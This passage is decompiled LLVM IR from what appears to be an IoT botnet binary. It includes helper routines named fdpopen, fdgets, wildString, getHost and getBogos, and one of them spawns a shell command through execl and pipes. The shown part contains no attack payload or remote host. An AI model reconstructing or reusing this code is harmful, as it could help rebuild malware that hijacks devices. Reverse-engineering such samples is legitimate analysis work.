  store i32 268440180, i32* @lr, align 4
  %v4_10001270 = call i32 @__libc_send(i32 %arg1, i32 %v0_100011cc, i32 %v0_10001258, i32 16384)
  store i32 %v0_100011cc, i32* @r3, align 4
  store i32 268440196, i32* @lr, align 4
  %v0_10001280 = call i32 @free()
  ret i32 %v4_10001270

; uselistorder directives
  uselistorder i32 %v0_100011cc, { 1, 4, 2, 0, 3, 5, 6 }
  uselistorder i32* %stack_var_-140, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %v2_100012c4 = load i8, i8* %arg2, align 1
  %v3_100012cc = icmp eq i8 %v2_100012c4, 114
  br i1 %v3_100012cc, label %dec_label_pc_100012e8, label %dec_label_pc_100012d4

dec_label_pc_100012d4:                            ; preds = %entry
  %v2_100012d8 = load i8, i8* %arg2, align 1
  %v3_100012e0 = icmp eq i8 %v2_100012d8, 119
  br i1 %v3_100012e0, label %dec_label_pc_100012e8, label %dec_label_pc_10001300

dec_label_pc_100012e8:                            ; preds = %dec_label_pc_100012d4, %entry
  %v1_100012ec = add i32 %tmp, 1
  %v2_100012ec = inttoptr i32 %v1_100012ec to i8*
  %v3_100012f0 = load i8, i8* %v2_100012ec, align 1
  %v3_100012f8 = icmp eq i8 %v3_100012f0, 0
  br i1 %v3_100012f8, label %dec_label_pc_1000130c, label %dec_label_pc_10001300

dec_label_pc_10001300:                            ; preds = %dec_label_pc_100012d4, %dec_label_pc_100012e8
  br label %dec_label_pc_10001530

dec_label_pc_1000130c:                            ; preds = %dec_label_pc_100012e8
  %v2_1000130c = ptrtoint i32* %stack_var_-48 to i32
  store i32 268440344, i32* @lr, align 4
  %v3_10001314 = call i32 @__GI_pipe(i32 %v2_1000130c, i32 %v1_100012ec)
  store i32 %v3_10001314, i32* @r3, align 4
  %tmp15 = icmp sgt i32 %v3_10001314, -1
  br i1 %tmp15, label %dec_label_pc_10001330, label %dec_label_pc_10001324

dec_label_pc_10001324:                            ; preds = %dec_label_pc_1000130c
  br label %dec_label_pc_10001530

dec_label_pc_10001330:                            ; preds = %dec_label_pc_1000130c
  %v3_10001334 = load i32, i32* @global_var_100287f0.14, align 4
  %v3_10001338 = icmp eq i32 %v3_10001334, 0
  br i1 %v3_10001338, label %dec_label_pc_10001340, label %dec_label_pc_100013c0

dec_label_pc_10001340:                            ; preds = %dec_label_pc_10001330
  store i32 268440388, i32* @lr, align 4
  %v1_10001340 = call i32 @getdtablesize(i32 268632064)
  %v2_10001350 = icmp sgt i32 %v1_10001340, 0
  br i1 %v2_10001350, label %dec_label_pc_10001364, label %dec_label_pc_10001358

dec_label_pc_10001358:                            ; preds = %dec_label_pc_10001340
  br label %dec_label_pc_10001530

dec_label_pc_10001364:                            ; preds = %dec_label_pc_10001340
  %v1_10001368 = mul i32 %v1_10001340, 4
  store i32 %v1_10001368, i32* @r3, align 4
  store i32 268440436, i32* @lr, align 4
  %v0_10001370 = call i32 @malloc()
  store i32 %v0_10001370, i32* @global_var_100287f0.14, align 4
  %v3_10001388 = icmp eq i32 %v0_10001370, 0
  br i1 %v3_10001388, label %dec_label_pc_10001390, label %dec_label_pc_1000139c

dec_label_pc_10001390:                            ; preds = %dec_label_pc_10001364
  br label %dec_label_pc_10001530

dec_label_pc_1000139c:                            ; preds = %dec_label_pc_10001364
  store i32 ptrtoint (i32* @global_var_100013c0.15 to i32), i32* @lr, align 4
  %v3_100013bc = call i32 @__GI_memset(i32 %v0_10001370, i32 0, i32 %v1_10001368)
  store i32 %v3_100013bc, i32* @r3, align 4
  br label %dec_label_pc_100013c0

dec_label_pc_100013c0:                            ; preds = %dec_label_pc_10001330, %dec_label_pc_1000139c
  store i32 268440516, i32* @lr, align 4
  %v0_100013c0 = call i32 @__vfork()
  %v4_100013dc = icmp eq i32 %v0_100013c0, -1
  br i1 %v4_100013dc, label %dec_label_pc_100013f4, label %dec_label_pc_100013e4

dec_label_pc_100013e4:                            ; preds = %dec_label_pc_100013c0
  %v3_100013e8 = icmp eq i32 %v0_100013c0, 0
  br i1 %v3_100013e8, label %dec_label_pc_10001418, label %dec_label_pc_100014c8

dec_label_pc_100013f4:                            ; preds = %dec_label_pc_100013c0
  %v3_100013f4 = load i32, i32* %stack_var_-48, align 4
  store i32 268440576, i32* @lr, align 4
  %v1_100013fc = call i32 @__libc_close(i32 %v3_100013f4)
  store i32 ptrtoint (i32* @global_var_1000140c.16 to i32), i32* @lr, align 4
  %v1_10001408 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001530

dec_label_pc_10001418:                            ; preds = %dec_label_pc_100013e4
  %v3_1000141c = load i8, i8* %arg2, align 1
  %v3_10001424 = icmp eq i8 %v3_1000141c, 114
  br i1 %v3_10001424, label %dec_label_pc_1000142c, label %dec_label_pc_10001464

dec_label_pc_1000142c:                            ; preds = %dec_label_pc_10001418
  %v3_10001430 = icmp eq i32 %tmp3, 1
  br i1 %v3_10001430, label %dec_label_pc_10001454, label %dec_label_pc_10001438

dec_label_pc_10001438:                            ; preds = %dec_label_pc_1000142c
  store i32 268440648, i32* @lr, align 4
  %v4_10001444 = call i32 @dup2(i32 %tmp3, i32 1, i32 %tmp)
  store i32 268440660, i32* @lr, align 4
  %v1_10001450 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001454

dec_label_pc_10001454:                            ; preds = %dec_label_pc_1000142c, %dec_label_pc_10001438
  %v3_10001454 = load i32, i32* %stack_var_-48, align 4
  store i32 ptrtoint (i32* @global_var_10001460.17 to i32), i32* @lr, align 4
  %v1_1000145c = call i32 @__libc_close(i32 %v3_10001454)
  br label %dec_label_pc_10001498

dec_label_pc_10001464:                            ; preds = %dec_label_pc_10001418
  %v3_10001464 = load i32, i32* %stack_var_-48, align 4
  %v3_10001468 = icmp eq i32 %v3_10001464, 0
  br i1 %v3_10001468, label %dec_label_pc_1000148c, label %dec_label_pc_10001470

dec_label_pc_10001470:                            ; preds = %dec_label_pc_10001464
  store i32 268440704, i32* @lr, align 4
  %v4_1000147c = call i32 @dup2(i32 %v3_10001464, i32 0, i32 %tmp)
  %v3_10001480 = load i32, i32* %stack_var_-48, align 4
  store i32 268440716, i32* @lr, align 4
  %v1_10001488 = call i32 @__libc_close(i32 %v3_10001480)
  br label %dec_label_pc_1000148c

dec_label_pc_1000148c:                            ; preds = %dec_label_pc_10001464, %dec_label_pc_10001470
  store i32 268440728, i32* @lr, align 4
  %v1_10001494 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001498

dec_label_pc_10001498:                            ; preds = %dec_label_pc_10001454, %dec_label_pc_1000148c
  %v8_100014bc = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_10015228.18 to i32), i32 ptrtoint ([3 x i8]* @global_var_10014e70.19 to i32), i32 ptrtoint ([3 x i8]* @global_var_10015230.20 to i32), i32 %arg1, i32 0)
  %v1_100014c4 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_100014c8

dec_label_pc_100014c8:                            ; preds = %dec_label_pc_100013e4, %dec_label_pc_10001498
  %v2_100014cc = load i8, i8* %arg2, align 1
  %v3_100014d4 = icmp eq i8 %v2_100014cc, 114
  %v3_100014dc = load i32, i32* %stack_var_-48, align 4
  br i1 %v3_100014d4, label %dec_label_pc_100014dc, label %dec_label_pc_100014f4

dec_label_pc_100014dc:                            ; preds = %dec_label_pc_100014c8
  store i32 ptrtoint (i32* @global_var_100014f0.22 to i32), i32* @lr, align 4
  %v1_100014ec = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001508

dec_label_pc_100014f4:                            ; preds = %dec_label_pc_100014c8
  store i32 268440840, i32* @lr, align 4
  %v1_10001504 = call i32 @__libc_close(i32 %v3_100014dc)
  br label %dec_label_pc_10001508

dec_label_pc_10001508:                            ; preds = %dec_label_pc_100014dc, %dec_label_pc_100014f4
  %stack_var_-36.0 = phi i32 [ %v3_100014dc, %dec_label_pc_100014dc ], [ %tmp3, %dec_label_pc_100014f4 ]
  %v1_1000150c = mul i32 %stack_var_-36.0, 4
  %v3_10001518 = load i32, i32* @global_var_100287f0.14, align 4
  %v2_1000151c = add i32 %v3_10001518, %v1_1000150c
  %v2_10001524 = inttoptr i32 %v2_1000151c to i32*
  store i32 %v0_100013c0, i32* %v2_10001524, align 4
  br label %dec_label_pc_10001530

dec_label_pc_10001530:                            ; preds = %dec_label_pc_100013f4, %dec_label_pc_10001390, %dec_label_pc_10001358, %dec_label_pc_10001324, %dec_label_pc_10001300, %dec_label_pc_10001508
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_10001390 ], [ -1, %dec_label_pc_100013f4 ], [ %stack_var_-36.0, %dec_label_pc_10001508 ], [ -1, %dec_label_pc_10001358 ], [ -1, %dec_label_pc_10001324 ], [ -1, %dec_label_pc_10001300 ]
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32 %v3_100014dc, { 1, 0 }
  uselistorder i32 %v1_10001368, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10001530, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10001508, { 1, 0 }
  uselistorder label %dec_label_pc_100014c8, { 1, 0 }
  uselistorder label %dec_label_pc_10001498, { 1, 0 }
  uselistorder label %dec_label_pc_1000148c, { 1, 0 }
  uselistorder label %dec_label_pc_10001454, { 1, 0 }
  uselistorder label %dec_label_pc_100013c0, { 1, 0 }
  uselistorder label %dec_label_pc_10001300, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-308 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %v3_1000156c = load i32, i32* @global_var_100287f0.14, align 4
  %v3_10001570 = icmp eq i32 %v3_1000156c, 0
  br i1 %v3_10001570, label %dec_label_pc_1000159c, label %dec_label_pc_10001578

dec_label_pc_10001578:                            ; preds = %entry
  %v1_1000157c = mul i32 %arg1, 4
  %v2_1000158c = add i32 %v3_1000156c, %v1_1000157c
  %v1_10001590 = inttoptr i32 %v2_1000158c to i32*
  %v2_10001590 = load i32, i32* %v1_10001590, align 4
  %v3_10001594 = icmp eq i32 %v2_10001590, 0
  br i1 %v3_10001594, label %dec_label_pc_1000159c, label %dec_label_pc_100015a8

dec_label_pc_1000159c:                            ; preds = %dec_label_pc_10001578, %entry
  br label %dec_label_pc_100016d0

dec_label_pc_100015a8:                            ; preds = %dec_label_pc_10001578
  store i32 268441008, i32* @lr, align 4
  %v1_100015ac = call i32 @__libc_close(i32 %arg1)
  %v2_100015b0 = ptrtoint i32* %stack_var_-180 to i32
  store i32 268441020, i32* @lr, align 4
  %v1_100015b8 = call i32 @sigemptyset(i32 %v2_100015b0)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441036, i32* @lr, align 4
  %v2_100015c8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 2)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441052, i32* @lr, align 4
  %v2_100015d8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 3)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441068, i32* @lr, align 4
  %v2_100015e8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 1)
  %v2_100015f0 = ptrtoint i32* %stack_var_-308 to i32
  store i32 268441092, i32* @lr, align 4
  %v3_10001600 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_100015b0, i32 %v2_100015f0)
  %v2_10001620 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_10001604

dec_label_pc_10001604:                            ; preds = %dec_label_pc_1000164c, %dec_label_pc_100015a8
  %v3_10001614 = load i32, i32* @global_var_100287f0.14, align 4
  %v2_10001618 = add i32 %v3_10001614, %v1_1000157c
  %v1_1000161c = inttoptr i32 %v2_10001618 to i32*
  %v2_1000161c = load i32, i32* %v1_1000161c, align 4
  store i32 268441140, i32* @lr, align 4
  %v3_10001630 = call i32 @__libc_waitpid(i32 %v2_1000161c, i32 %v2_10001620, i32 0)
  %v4_10001644 = icmp eq i32 %v3_10001630, -1
  br i1 %v4_10001644, label %dec_label_pc_1000164c, label %dec_label_pc_10001660

dec_label_pc_1000164c:                            ; preds = %dec_label_pc_10001604
  %v0_1000164c = call i32 @__errno_location()
  %v1_10001654 = inttoptr i32 %v0_1000164c to i32*
  %v2_10001654 = load i32, i32* %v1_10001654, align 4
  %v3_10001658 = icmp eq i32 %v2_10001654, 4
  br i1 %v3_10001658, label %dec_label_pc_10001604, label %dec_label_pc_10001660

dec_label_pc_10001660:                            ; preds = %dec_label_pc_10001604, %dec_label_pc_1000164c
  %v4_10001644.lcssa = phi i1 [ false, %dec_label_pc_10001604 ], [ true, %dec_label_pc_1000164c ]
  store i32 268441204, i32* @lr, align 4
  %v3_10001670 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_100015f0, i32 0)
  %v1_10001678 = mul i32 %tmp5, 4
  %v3_10001684 = load i32, i32* @global_var_100287f0.14, align 4
  %v2_10001688 = add i32 %v3_10001684, %v1_10001678
  %v2_10001690 = inttoptr i32 %v2_10001688 to i32*
  store i32 0, i32* %v2_10001690, align 4
  br i1 %v4_10001644.lcssa, label %dec_label_pc_100016c8, label %dec_label_pc_100016a4

dec_label_pc_100016a4:                            ; preds = %dec_label_pc_10001660
  %v3_100016a4 = load i32, i32* %stack_var_-52, align 4
  %v1_100016b0 = call i32 @__asm_rlwinm(i32 %v3_100016a4, i32 0, i32 16, i32 23)
  %v4_100016b4 = sdiv i32 %v1_100016b0, 256
  br label %dec_label_pc_100016c8

dec_label_pc_100016c8:                            ; preds = %dec_label_pc_10001660, %dec_label_pc_100016a4
  %storemerge2 = phi i32 [ %v4_100016b4, %dec_label_pc_100016a4 ], [ -1, %dec_label_pc_10001660 ]
  br label %dec_label_pc_100016d0

dec_label_pc_100016d0:                            ; preds = %dec_label_pc_1000159c, %dec_label_pc_100016c8
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_100016c8 ], [ -1, %dec_label_pc_1000159c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_100015b0, { 0, 2, 1, 4, 3, 6, 5, 7 }
  uselistorder i32 %v1_1000157c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100016d0, { 1, 0 }
  uselistorder label %dec_label_pc_100016c8, { 1, 0 }
  uselistorder label %dec_label_pc_10001660, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_10001764

dec_label_pc_10001724:                            ; preds = %dec_label_pc_10001774
  store i32 268441412, i32* @lr, align 4
  %v1_10001740 = call i32 @__libc_read(i32 %arg3)
  %v1_10001750 = add nuw i32 %storemerge25, 1
  %v3_1000175c = icmp eq i32 %v1_10001740, 1
  br i1 %v3_1000175c, label %dec_label_pc_10001764, label %dec_label_pc_10001798

dec_label_pc_10001764:                            ; preds = %entry, %dec_label_pc_10001724
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_10001750, %dec_label_pc_10001724 ]
  %v2_1000176c = icmp slt i32 %storemerge25, %arg2
  br i1 %v2_1000176c, label %dec_label_pc_10001774, label %dec_label_pc_10001798

dec_label_pc_10001774:                            ; preds = %dec_label_pc_10001764
  %v2_10001780 = add i32 %storemerge25, %arg1
  %v1_10001784 = add i32 %v2_10001780, -1
  %v1_10001788 = inttoptr i32 %v1_10001784 to i8*
  %v2_10001788 = load i8, i8* %v1_10001788, align 1
  %v3_10001790 = icmp eq i8 %v2_10001788, 10
  br i1 %v3_10001790, label %dec_label_pc_10001798, label %dec_label_pc_10001724

dec_label_pc_10001798:                            ; preds = %dec_label_pc_10001774, %dec_label_pc_10001764, %dec_label_pc_10001724
  %stack_var_-36.0.lcssa = phi i32 [ 1, %dec_label_pc_10001774 ], [ 1, %dec_label_pc_10001764 ], [ %v1_10001740, %dec_label_pc_10001724 ]
  %v3_1000179c = icmp eq i32 %stack_var_-36.0.lcssa, 0
  %storemerge = select i1 %v3_1000179c, i32 0, i32 %arg1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10001740, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001764, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_100018343 = load i8, i8* %arg1, align 1
  %v3_1000183c6 = icmp eq i8 %v2_100018343, 0
  br i1 %v3_1000183c6, label %dec_label_pc_10001850, label %dec_label_pc_10001844

dec_label_pc_100017f4:                            ; preds = %dec_label_pc_10001844
  %v1_100017f8 = mul i32 %stack_var_-40.07, 16
  %v2_10001800 = load i8, i8* %stack_var_-24.08, align 1
  %v3_10001800 = zext i8 %v2_10001800 to i32
  %v1_10001810 = mul nuw nsw i32 %v3_10001800, 4
  %v2_10001814 = add i32 %v1_10001810, ptrtoint (i32* @global_var_10015234.23 to i32)
  %v1_10001818 = inttoptr i32 %v2_10001814 to i32*
  %v2_10001818 = load i32, i32* %v1_10001818, align 4
  %v2_1000181c = or i32 %v2_10001818, %v1_100017f8
  %v1_10001828 = add i32 %v4_100018309, 1
  %v5_1000182c = inttoptr i32 %v1_10001828 to i8*
  %v2_10001834 = load i8, i8* %v5_1000182c, align 1
  %v3_1000183c = icmp eq i8 %v2_10001834, 0
  br i1 %v3_1000183c, label %dec_label_pc_10001850, label %dec_label_pc_10001844

dec_label_pc_10001844:                            ; preds = %entry, %dec_label_pc_100017f4
  %v4_100018309 = phi i32 [ %v1_10001828, %dec_label_pc_100017f4 ], [ %tmp, %entry ]
  %stack_var_-24.08 = phi i8* [ %v5_1000182c, %dec_label_pc_100017f4 ], [ %arg1, %entry ]
  %stack_var_-40.07 = phi i32 [ %v2_1000181c, %dec_label_pc_100017f4 ], [ 0, %entry ]
  %tmp17 = icmp sgt i32 %stack_var_-40.07, -1
  br i1 %tmp17, label %dec_label_pc_100017f4, label %dec_label_pc_10001850

dec_label_pc_10001850:                            ; preds = %dec_label_pc_100017f4, %dec_label_pc_10001844, %entry
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v2_1000181c, %dec_label_pc_100017f4 ], [ %stack_var_-40.07, %dec_label_pc_10001844 ]
  ret i32 %stack_var_-40.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-40.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001850, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001844, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %v2_1000188c = load i8, i8* %arg1, align 1
  %v3_1000189c = icmp eq i8 %v2_1000188c, 42
  br i1 %v3_1000189c, label %dec_label_pc_100018d4, label %dec_label_pc_100018a4

dec_label_pc_100018a4:                            ; preds = %entry
  %v3_100018a8 = icmp eq i8 %v2_1000188c, 63
  br i1 %v3_100018a8, label %dec_label_pc_10001948, label %dec_label_pc_100018b0

dec_label_pc_100018b0:                            ; preds = %dec_label_pc_100018a4
  %v3_100018b4 = icmp eq i8 %v2_1000188c, 0
  br i1 %v3_100018b4, label %dec_label_pc_100018c0, label %dec_label_pc_100019a4

dec_label_pc_100018c0:                            ; preds = %dec_label_pc_100018b0
  %v2_100018c4 = load i8, i8* %tmp, align 1
  %v3_100018c4 = zext i8 %v2_100018c4 to i32
  br label %dec_label_pc_10001a28

dec_label_pc_100018d4:                            ; preds = %entry
  %v2_100018d8 = add i32 %tmp8, 1
  store i32 268441832, i32* @lr, align 4
  %v5_100018e4 = inttoptr i32 %v2_100018d8 to i8*
  %v6_100018e4 = call i32 @wildString(i8* %v5_100018e4, i32 %arg2, i32 %tmp8)
  %v3_100018ec = icmp eq i32 %v6_100018e4, 0
  br i1 %v3_100018ec, label %dec_label_pc_10001934, label %dec_label_pc_100018f4

dec_label_pc_100018f4:                            ; preds = %dec_label_pc_100018d4
  %v2_100018f8 = load i8, i8* %tmp, align 1
  %v3_10001900 = icmp eq i8 %v2_100018f8, 0
  br i1 %v3_10001900, label %dec_label_pc_1000193c, label %dec_label_pc_10001908

dec_label_pc_10001908:                            ; preds = %dec_label_pc_100018f4
  %v2_1000190c = add i32 %arg2, 1
  store i32 268441884, i32* @lr, align 4
  %v6_10001918 = call i32 @wildString(i8* nonnull %arg1, i32 %v2_1000190c, i32 %arg2)
  %v3_10001920 = icmp eq i32 %v6_10001918, 0
  br i1 %v3_10001920, label %dec_label_pc_10001934, label %dec_label_pc_1000193c

dec_label_pc_10001934:                            ; preds = %dec_label_pc_10001908, %dec_label_pc_100018d4
  br label %dec_label_pc_1000193c

dec_label_pc_1000193c:                            ; preds = %dec_label_pc_100018f4, %dec_label_pc_10001908, %dec_label_pc_10001934
  %storemerge3 = phi i32 [ 0, %dec_label_pc_10001934 ], [ 1, %dec_label_pc_10001908 ], [ 1, %dec_label_pc_100018f4 ]
  br label %dec_label_pc_10001a28

dec_label_pc_10001948:                            ; preds = %dec_label_pc_100018a4
  %v2_1000194c = load i8, i8* %tmp, align 1
  %v3_10001954 = icmp eq i8 %v2_1000194c, 0
  br i1 %v3_10001954, label %dec_label_pc_10001998, label %dec_label_pc_1000195c

dec_label_pc_1000195c:                            ; preds = %dec_label_pc_10001948
  %v1_10001960 = add i32 %tmp8, 1
  %v2_10001968 = add i32 %arg2, 1
  store i32 268441976, i32* @lr, align 4
  %v4_10001974 = inttoptr i32 %v1_10001960 to i8*
  %v5_10001974 = call i32 @wildString(i8* %v4_10001974, i32 %v2_10001968, i32 %arg2)
  %v3_1000197c = icmp ne i32 %v5_10001974, 0
  %. = zext i1 %v3_1000197c to i32
  br label %dec_label_pc_10001998

dec_label_pc_10001998:                            ; preds = %dec_label_pc_1000195c, %dec_label_pc_10001948
  %storemerge2 = phi i32 [ 1, %dec_label_pc_10001948 ], [ %., %dec_label_pc_1000195c ]
  br label %dec_label_pc_10001a28

dec_label_pc_100019a4:                            ; preds = %dec_label_pc_100018b0
  %v3_100019a8 = load i8, i8* %arg1, align 1
  %v4_100019a8 = zext i8 %v3_100019a8 to i32
  store i32 268442044, i32* @lr, align 4
  %v3_100019b8 = call i32 @__GI_toupper(i32 %v4_100019a8, i32 %tmp8)
  %v3_100019c4 = load i8, i8* %tmp, align 1
  %v4_100019c4 = zext i8 %v3_100019c4 to i32
  store i32 268442072, i32* @lr, align 4
  %v3_100019d4 = call i32 @__GI_toupper(i32 %v4_100019c4, i32 %arg2)
  %v4_100019dc = icmp eq i32 %v3_100019b8, %v3_100019d4
  br i1 %v4_100019dc, label %dec_label_pc_100019e4, label %dec_label_pc_10001a20

dec_label_pc_100019e4:                            ; preds = %dec_label_pc_100019a4
  %v1_100019e8 = add i32 %tmp8, 1
  %v2_100019f0 = add i32 %arg2, 1
  store i32 268442112, i32* @lr, align 4
  %v4_100019fc = inttoptr i32 %v1_100019e8 to i8*
  %v5_100019fc = call i32 @wildString(i8* %v4_100019fc, i32 %v2_100019f0, i32 %arg2)
  %v3_10001a04 = icmp ne i32 %v5_100019fc, 0
  %.7 = zext i1 %v3_10001a04 to i32
  br label %dec_label_pc_10001a20

dec_label_pc_10001a20:                            ; preds = %dec_label_pc_100019e4, %dec_label_pc_100019a4
  %storemerge = phi i32 [ 1, %dec_label_pc_100019a4 ], [ %.7, %dec_label_pc_100019e4 ]
  br label %dec_label_pc_10001a28

dec_label_pc_10001a28:                            ; preds = %dec_label_pc_10001998, %dec_label_pc_1000193c, %dec_label_pc_100018c0, %dec_label_pc_10001a20
  %stack_var_-36.0 = phi i32 [ %storemerge3, %dec_label_pc_1000193c ], [ %storemerge2, %dec_label_pc_10001998 ], [ %v3_100018c4, %dec_label_pc_100018c0 ], [ %storemerge, %dec_label_pc_10001a20 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_10001a28, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000193c, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268442228, i32* @lr, align 4
  %v1_10001a70 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_10001a70, i32* %arg2, align 4
  %v4_10001a8c = icmp eq i32 %v1_10001a70, -1
  %. = zext i1 %v4_10001a8c to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_10001b1c2 = load i8, i8* %arg1, align 1
  %v3_10001b245 = icmp eq i8 %v2_10001b1c2, 0
  br i1 %v3_10001b245, label %dec_label_pc_10001b2c, label %dec_label_pc_10001ae4

dec_label_pc_10001ae4:                            ; preds = %entry, %dec_label_pc_10001ae4
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_10001ae4 ], [ %arg1, %entry ]
  %storemerge.in6 = phi i32 [ %v1_10001b10, %dec_label_pc_10001ae4 ], [ %tmp, %entry ]
  %v3_10001ae8 = load i8, i8* %storemerge7, align 1
  %v4_10001ae8 = zext i8 %v3_10001ae8 to i32
  store i32 %v4_10001ae8, i32* %r3.global-to-local, align 4
  store i32 268442364, i32* @lr, align 4
  %v3_10001af8 = call i32 @__GI_toupper(i32 %v4_10001ae8, i32 %storemerge.in6)
  store i32 %v3_10001af8, i32* %r3.global-to-local, align 4
  %v1_10001b08 = trunc i32 %v3_10001af8 to i8
  store i8 %v1_10001b08, i8* %storemerge7, align 1
  %v1_10001b10 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_10001b10 to i8*
  %v2_10001b1c = load i8, i8* %storemerge, align 1
  %v3_10001b24 = icmp eq i8 %v2_10001b1c, 0
  br i1 %v3_10001b24, label %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge, label %dec_label_pc_10001ae4

dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge: ; preds = %dec_label_pc_10001ae4
  %v0_10001b40.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001b2c

dec_label_pc_10001b2c:                            ; preds = %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge, %entry
  %v0_10001b40 = phi i32 [ %v0_10001b40.pre, %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge ], [ %tmp, %entry ]
  ret i32 %v0_10001b40

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_10001b10, { 1, 0 }
  uselistorder i32 %storemerge.in6, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10001ae4, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  store i32 268442480, i32* @lr, align 4
  %v3_10001b6c = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_10015634.24 to i32), i32 0)
  %v2_10001d0c = ptrtoint i32* %stack_var_-4128 to i32
  %v1_10001b84 = bitcast i32* %stack_var_-4128 to i8*
  br label %dec_label_pc_10001d0c

dec_label_pc_10001b7c:                            ; preds = %dec_label_pc_10001d0c
  store i32 268442504, i32* @lr, align 4
  %v2_10001b84 = call i32 @uppercase(i8* %v1_10001b84)
  store i32 268442524, i32* @lr, align 4
  %v5_10001b98 = call i32 @strstr(i32 %v2_10001d0c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10015644.25, i32 0, i32 0), i32 268500992)
  %v4_10001ba8 = icmp eq i32 %v5_10001b98, %v2_10001d0c
  br i1 %v4_10001ba8, label %dec_label_pc_10001bb0, label %dec_label_pc_10001cf4

dec_label_pc_10001bb0:                            ; preds = %dec_label_pc_10001b7c
  %tmp15 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_10001bcc

dec_label_pc_10001bc0:                            ; preds = %dec_label_pc_10001bf4, %dec_label_pc_10001be0, %dec_label_pc_10001bcc
  %v1_10001bc4 = add i32 %v4_10001bcc, 1
  %v5_10001bc8 = inttoptr i32 %v1_10001bc4 to i8*
  br label %dec_label_pc_10001bcc

dec_label_pc_10001bcc:                            ; preds = %dec_label_pc_10001bb0, %dec_label_pc_10001bc0
  %storemerge2 = phi i8* [ %v5_10001bc8, %dec_label_pc_10001bc0 ], [ %tmp15, %dec_label_pc_10001bb0 ]
  %v4_10001bcc = ptrtoint i8* %storemerge2 to i32
  %v2_10001bd0 = load i8, i8* %storemerge2, align 1
  %v3_10001bd8 = icmp eq i8 %v2_10001bd0, 32
  br i1 %v3_10001bd8, label %dec_label_pc_10001bc0, label %dec_label_pc_10001be0

